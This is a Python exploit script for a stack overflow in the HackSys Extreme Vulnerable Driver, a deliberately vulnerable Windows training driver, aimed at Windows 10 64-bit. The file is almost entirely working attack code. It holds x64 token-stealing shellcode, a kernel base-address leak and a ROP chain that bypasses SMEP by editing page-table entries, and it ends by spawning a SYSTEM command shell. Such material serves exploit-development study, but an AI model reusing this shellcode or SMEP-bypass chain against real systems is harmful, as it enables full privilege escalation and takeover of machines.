import ctypes, os, struct, sys, win32con
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32

def debug_print(message):
	print message
	kernel32.OutputDebugStringA(message + "\n")

def heap_alloc_payload():
	#---[Setup]
	token_stealing_shellcode = "\xB9" + struct.pack("<L", os.getpid())      # mov ecx, PID
	token_stealing_shellcode += "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"      # mov rax,QWORD PTR gs:0x188
	token_stealing_shellcode += "\x48\x8B\x80\xB8\x00\x00\x00"              # mov rax,QWORD PTR [rax+0xb8] EPROCESS
	token_stealing_shellcode += "\x48\x8d\x80\xf0\x02\x00\x00"              # lea rax,[rax+0x2f0] # ActiveProcessLink
	#---[Copy System PID token]
	token_stealing_shellcode += "\x48\x8b\x00"                              # mov rax,QWORD PTR [rax]
	token_stealing_shellcode += "\x48\x8b\x58\xf8"                          # mov rbx,QWORD PTR [rax-0x8] # UniqueProcessID
	token_stealing_shellcode += "\x48\x83\xfb\x04"                          # cmp rbx,0x4
	token_stealing_shellcode += "\x75\xf3"                                  # jne
	token_stealing_shellcode += "\x48\x8b\x58\x68"                          # mov rbx, QWORD PTR [rax+0x68] # GET TOKEN of SYSTEM
	#---[Paste System PID token in Current Process]
	token_stealing_shellcode += "\x53"                                      # PUSH RBX
	token_stealing_shellcode += "\x48\x8b\x00"                              # mov    rax,QWORD PTR [rax]
	token_stealing_shellcode += "\x48\x8b\x58\xf8"                          # mov    rbx,QWORD PTR [rax-0x8] # UniqueProcessID
	token_stealing_shellcode += "\x39\xcb"                                  # cmp    ebx, ecx # our PID
	token_stealing_shellcode += "\x75\xf5"                                  # jne
	token_stealing_shellcode += "\x5b"                                      # POP RBX
	token_stealing_shellcode += "\x48\x89\x58\x68"                          # mov    QWORD PTR[rax + 0x68], rbx
	#---[Recover]
	token_stealing_shellcode += "\x48\x31\xC0"                              # NTSTATUS -> STATUS_SUCCESS
	token_stealing_shellcode += "\x48\x83\xC4\x28"                          # add rsp, 0x28
	token_stealing_shellcode += "\xC3"                                      # ret
		
	
	payload_length = len(token_stealing_shellcode)
	payload_address = id(token_stealing_shellcode) + 32
	debug_print ("[+] Payload address: 0x%X" % payload_address)
	return payload_length, payload_address

	
def virtual_alloc_payload():
	payload_length, payload_address = heap_alloc_payload()
	va_address = kernel32.VirtualAlloc(None, 1024,  win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_EXECUTE_READWRITE)
	debug_print("[+] VirtualAlloc address: 0x%X" % va_address)	
	debug_print("[+] Copying payload to VirtualAlloc region")
	ctypes.memmove(va_address, payload_address, payload_length)
	
	return va_address
	
	
class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 2),
                ("ImageBase", c_void_p), 
                ("ImageSize", c_long),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("FullPathName", c_char * 256)]


def get_base_address(input_modules):
	modules = {}

	# Allocate arbitrary buffer and call NtQuerySystemInformation
	system_information = create_string_buffer(0)
	systeminformationlength = c_ulong(0)
	ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
	
	# Call NtQuerySystemInformation second time with right size
	system_information = create_string_buffer(systeminformationlength.value)
	ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
	
	# Read first 4 bytes which contains number of modules retrieved
	module_count = c_ulong(0)
	module_count_string = create_string_buffer(system_information.raw[:8])
	ctypes.memmove(addressof(module_count), module_count_string, sizeof(module_count))
	
	# Marshal each module information and store it in a dictionary<name, SYSTEM_MODULE_INFORMATION>
	system_information = create_string_buffer(system_information.raw[8:])
	for x in range(module_count.value):
		smi = SYSTEM_MODULE_INFORMATION()
		temp_system_information = create_string_buffer(system_information.raw[sizeof(smi) * x: sizeof(smi) * (x+1)])
		ctypes.memmove(addressof(smi), temp_system_information, sizeof(smi))
		module_name =  smi.FullPathName.split('\\')[-1]
		modules[module_name] = smi
		
	debug_print ("[+] NtQuerySystemInformation():")
		
	# Get base addresses and return them in a list
	base_addresses = []
	for input_module in input_modules:
		try:
			base_address = modules[input_module].ImageBase
			debug_print ("\t[-] %s base address: 0x%X" % (input_module, base_address))
			base_addresses.append(base_address)
		except:
			base_addresses.append(0)
	
	return base_addresses
	

def get_pxe_address (address):
	address = address >> 9
	address = address | 0xFFFFF68000000000
	address = address & 0xFFFFF6FFFFFFFFF8
	return address
	
	
def trigger_stack_overflow():
	dwReturn      = c_ulong()
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		debug_print ("[!] Driver handle not found : Error " + str(ctypes.GetLastError()))
		sys.exit()
	
	base_addresses = get_base_address(["hal.dll", "win32kfull.sys"])
	hal_base_address = base_addresses[0]
	win32kfull_base_address = base_addresses[1]
	
	shellcode_ptr = virtual_alloc_payload()
	
	debug_print ("[+] Constructing malicious buffer w/ ROP chain")
	evil_input = "\x41" * 0x808                                             # junk
	evil_input += struct.pack("<Q", win32kfull_base_address + 0xD1122)      # POP RDX; RETN
	evil_input += struct.pack("<Q", 0x63000000)                             # 0x63000000 -> Supervisor Mode
	evil_input += struct.pack("<Q", hal_base_address + 0xFDB2)              # POP RAX; RETN
	evil_input += struct.pack("<Q", get_pxe_address(shellcode_ptr) - 3)     # PTE(shellcode ptr) - 3
	evil_input += struct.pack("<Q", hal_base_address + 0x9943)              # MOV [RAX], EDX; RETN
	evil_input += struct.pack("<Q", hal_base_address + 0x19B20)             # Invalidate Cache
	evil_input += struct.pack("<Q", shellcode_ptr)                          # shellcode ptr
	
	evil_size  = len(evil_input)
	evil_input_ptr = id(evil_input) + 32
	debug_print ("[+] Buf size: 0x%X" % evil_size)
	debug_print ("[+] Sending malicious buffer")
	debug_print ("[+] Triggering vuln ..")
	
	kernel32.DeviceIoControl(driver_handle, 0x222003, evil_input_ptr, evil_size, None, 0,byref(dwReturn), None)
	
	if shell.IsUserAnAdmin():
		debug_print ("[*] Enjoy Elevated Privs !\n")
		os.system('cmd.exe')
	else:
		debug_print ("[!] Exploit did not work. Re-run it!")

def preamble():
	debug_print ("")
	debug_print ("HackSys Extreme Vulnerable Driver : Stack Overflow")
	debug_print ("")
	debug_print ("Target Machine : Windows 10 64-bit (1511)")
	debug_print ("Author: @GradiusX")
	debug_print ("References: Windows SMEP Bypass (@NicoEconomou & @kiqueNissim)")
	debug_print ("")
		
if __name__ == '__main__':
	preamble()
	trigger_stack_overflow()